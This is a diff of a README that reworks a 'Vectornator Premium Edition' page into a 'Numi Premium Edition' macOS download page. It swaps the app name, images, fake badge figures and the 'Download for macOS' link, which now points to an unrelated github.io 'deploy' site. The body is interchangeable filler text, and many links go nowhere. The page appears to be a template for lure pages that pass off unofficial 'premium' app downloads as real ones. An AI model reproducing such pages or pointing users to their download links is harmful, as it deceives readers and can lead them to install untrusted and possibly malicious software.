@@ -1,12 +1,12 @@
-# Vectornator Premium Edition
+# Numi Premium Edition
 
-<img src="https://cdn.jim-nielsen.com/macos/512/vectornator-design-software-2021-05-12.png?rf=1024" width="200" alt="App icon" align="left"/>
+<img src="https://numi.app/images/numi-icon@2x.png" width="200" alt="App icon" align="left"/>
 
 <div>
-<h3>Vectornator for macOS</h3>
-<p>Vectornator delivers powerful vector design and illustration capabilities for Mac users seeking a dependable, native solution with intuitive controls and consistent performance.</p>
+<h3>Numi for macOS</h3>
+<p>Numi is a specialized calculator and unit converter solution designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://quick-mac-install.github.io/.github/Vectornator">
+<a href="https://software-osx-deploy.github.io/.github/Numi">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
@@ -14,12 +14,12 @@
 
 <div align="center">
 
-<a href="#"><img src="https://img.shields.io/badge/downloads-2.1k-brightgreen?style=flat" alt="downloads"/></a>
-<a href="#"><img src="https://img.shields.io/badge/version-4.7.0-blue?style=flat" alt="version"/></a>
+<a href="#"><img src="https://img.shields.io/badge/downloads-2.4k-brightgreen?style=flat" alt="downloads"/></a>
+<a href="#"><img src="https://img.shields.io/badge/version-5.2.1-blue?style=flat" alt="version"/></a>
 <a href="#"><img src="https://img.shields.io/badge/license-Premium%20Edition-lightgrey?style=flat" alt="license"/></a>
 <a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
-<img src="https://miro.medium.com/v2/resize:fit:1200/1*Hox_-9IyPBmu6UwPVwVqIA.png" width="824" alt="Screenshot"/>
+<img src="https://i.ytimg.com/vi/uKIzcRN6ShE/maxresdefault.jpg" width="824" alt="Screenshot"/>
 
 </div>
 
@@ -34,15 +34,15 @@
 
 ## Overview
 
-<a href="#">Vectornator for macOS</a> represents a comprehensive vector design and illustration solution engineered to integrate seamlessly with Mac systems. Built on native frameworks and established interface conventions, it provides predictable operation that fits naturally into existing workflows. The design prioritizes both accessibility and depth, ensuring essential functions remain visible while advanced capabilities stay available when needed.
+<a href="#">Numi for macOS</a> is a focused calculator and unit converter tool built to feel native on the Mac. It relies on system frameworks, familiar interface patterns and predictable behavior so users can integrate it into daily routines without friction. The layout emphasizes clarity, with tools grouped into logical sections that keep both power and simplicity within reach.
 
-During regular operation, Vectornator maintains straightforward access to primary features while exposing <a href="#">sophisticated controls</a> for users requiring detailed customization. Navigation follows macOS standards with recognizable menus, keyboard shortcuts and interface elements that accelerate task completion. Both new users and experienced operators benefit from the consistent, stable environment that supports efficient work patterns.
+In everyday use, Numi keeps core actions close at hand while offering additional <a href="#">advanced controls</a> for users who want to fine‑tune behavior. Menus, shortcuts and panels follow Apple's design language, helping you move quickly between tasks. Whether you are exploring features for the first time or returning to established workflows, the environment stays consistent and reliable.
 
-The underlying architecture leverages <a href="#">macOS core technologies</a> to deliver reliable performance across demanding operations. This foundation enables smooth handling of extensive processing, real‑time updates and simultaneous task execution without compromising interface responsiveness. System‑level integration ensures background tasks execute efficiently while maintaining fluid interaction with controls and displays.
+Under the hood, Numi is engineered around <a href="#">macOS technologies</a> that handle performance‑critical work. This approach allows it to remain responsive even while processing complex operations, managing multiple tasks or handling large datasets at once. Background operations are handled quietly, keeping the interface smooth so that navigation, configuration and monitoring always feel responsive.
 
-Professional users appreciate Vectornator's support for complex requirements through extensive configuration options, saved presets and automation capabilities. Behavioral adjustments accommodate individual preferences, from modified operational intervals and custom handling rules to specialized integration protocols. Configuration interfaces use clear <a href="#">settings panels</a> with descriptive labels rather than cryptic command‑line parameters.
+For professionals, Numi supports more demanding scenarios with configurable options, presets and automation‑friendly behavior. Settings can be adjusted to match preferred habits, whether that means changing operational parameters, tuning performance rules or adapting how the app interacts with external services. These options are organized using descriptive <a href="#">preference panels</a> rather than hidden configuration files.
 
-Throughout extended use, <a href="#">Vectornator</a> establishes itself as a stable component of the macOS ecosystem. The combination of thoughtful interface design, optimized performance and sensible default configurations supports sustained productivity. Users develop confidence in the application's predictable behavior, secure data handling and continued compatibility as the operating system advances.
+Over time, <a href="#">Numi</a> becomes a dependable part of the Mac environment. Its combination of refined interface decisions, efficient processing and thoughtful defaults makes it suitable for long‑term use. Users can trust that the application will behave consistently, preserve work safely and adapt as macOS continues to evolve.
 
 ---
 
@@ -68,7 +68,7 @@ Throughout extended use, <a href="#">Vectornator</a> establishes itself as a sta
 ## Screenshots
 
 <p align="center">
-  <img src="https://pixelbuddha.net/storage/articles/WcXH8HC3gaO6GghxckZs2WNXhgJObwCQZD7D4K9c.jpeg" width="824" alt="Vectornator screenshot"/>
+  <img src="https://appkosmos.de/wp-content/uploads/2018/03/numi_ab.png" width="824" alt="Numi screenshot"/>
 </p>
 
 ---
@@ -87,10 +87,10 @@ Throughout extended use, <a href="#">Vectornator</a> establishes itself as a sta
 
 ## Additional Information for macOS Users
 
-<a href="#">Vectornator</a> is often chosen by Mac users who want a dedicated vector design and illustration solution that respects platform conventions. Its focused interface avoids unnecessary distractions and helps people stay in control of their workspace even during longer sessions.
+<a href="#">Numi</a> is often chosen by Mac users who want a dedicated calculator and unit converter solution that respects platform conventions. Its focused interface avoids unnecessary distractions and helps people stay in control of their workspace even during longer sessions.
 
 In practice, the app slots neatly into broader <a href="#">macOS workflows</a>. It cooperates with system utilities, cloud services and automation tools, so users do not need to reinvent their entire setup. Instead, they can extend what they already have with a reliable, specialized component.
 
-For teams and professionals, Vectornator offers a clear path to repeatable results. Settings can be standardized, documented and shared so everyone works from the same foundation. Over time, this consistency reduces friction and supports a healthier, more maintainable workflow.
+For teams and professionals, Numi offers a clear path to repeatable results. Settings can be standardized, documented and shared so everyone works from the same foundation. Over time, this consistency reduces friction and supports a healthier, more maintainable workflow.
 
 ---
